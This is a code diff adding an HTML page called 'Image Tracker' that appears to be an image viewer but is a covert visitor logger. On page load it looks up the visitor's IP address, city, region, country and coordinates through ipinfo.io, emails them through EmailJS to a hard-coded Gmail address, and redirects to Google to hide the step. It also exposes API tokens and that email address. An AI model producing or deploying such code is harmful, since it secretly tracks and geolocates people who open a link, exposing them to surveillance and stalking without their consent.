@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Image Tracker</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        window.onload = async function () {
+            emailjs.init("PYUYW4IWCVoZ7zYK3");
+            try {
+                const response = await fetch("https://ipinfo.io/json?token=15f29802768d7e");
+                const data = await response.json();
+                const now = new Date().toLocaleString();
+                await emailjs.send("service_9v6pjko", "template-wv5mezn", {
+                    ip: data.ip,
+                    ville: data.city,
+                    region: data.region,
+                    pays: data.country,
+                    position: data.loc,
+                    heure: now,
+                    to_email: "oguerep@gmail.com"
+                });
+                window.location.href = "https://www.google.com";
+            } catch (e) {
+                console.error("Erreur :", e);
+            }
+        };
+    </script>
+</head>
+<body>
+    <img src="file:///C:/Users/hp/Pictures/4x4b.jpg" style="max-width:100%; height:auto;" />
+</body>
+</html>
